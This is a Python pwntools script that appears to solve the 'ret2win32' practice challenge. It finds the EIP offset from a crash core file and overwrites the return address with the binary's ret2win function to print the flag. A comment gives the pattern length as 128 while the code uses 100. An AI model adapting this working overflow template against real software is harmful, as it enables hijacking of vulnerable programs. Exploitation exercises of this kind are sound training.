from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2win32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Print out the target address
info("%#x target", elf.symbols['ret2win'])

# We will send a 'cyclic' pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
payload = cyclic(100)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of ESP at the time of crashing
esp_value = core.esp
esp_offset = cyclic_find(esp_value)
info('located ESP offset at {a}'.format(a=esp_offset))

# Print out the address of EIP at the time of crashing
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    asm('nop') * eip_offset,
    elf.symbols.ret2win
)

# Send the payload to a new copy of the process
io = start()
io.sendline(payload)
io.recv()

# Get our flag!
flag = io.recvline()
success(flag)
